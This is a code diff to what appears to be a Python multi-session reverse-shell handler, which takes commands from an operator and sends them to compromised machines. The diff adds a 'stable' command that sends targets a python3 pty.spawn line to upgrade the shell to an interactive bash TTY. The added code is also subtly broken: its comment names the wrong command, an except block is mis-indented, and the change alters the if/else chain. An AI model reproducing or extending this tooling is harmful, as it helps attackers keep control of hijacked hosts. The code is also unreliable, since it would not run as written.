@@ -78,6 +78,7 @@ def print_menu():
 ║ whoami        - Updates the session table                   ║
 ║ hostname      - Updates the session table                   ║
 ║ bs | CTRL+c   - Background the current session              ║
+║ stable        - Python3 TTY shell                           ║
 ║ die           - Terminates the current session              ║
 ╚═════════════════════════════════════════════════════════════╝{RESET}\n"""
     print(message)
@@ -174,8 +175,21 @@ def handle_client(client_socket, addr, session_number):
 
                 except Exception as e:
                     print_error(f"Error during gather for session {session_number}: {e}")
+            # Check for "hostname" command
+            if command.lower() == "stable":
+                try:
+                    session = sessions[session_number]
+                    client_socket = session["socket"]
 
-            
+                    # Send the TTY upgrade command
+                    tty_command = 'python3 -c \'import pty; pty.spawn("/bin/bash")\'\n'
+                    client_socket.sendall(tty_command.encode())
+
+                    print(f"{ORANGE}[*] Sent TTY upgrade command to session {session_number}.{RESET}")
+                    log_to_file(f"[*] Sent TTY upgrade command to session {session_number}.")
+                except Exception as e:
+                print_error(f"Error during shell upgrade for session {session_number}: {e}")
+
             # Send other commands to the client
             else:
                 client_socket.sendall(command.encode() + b"\n")
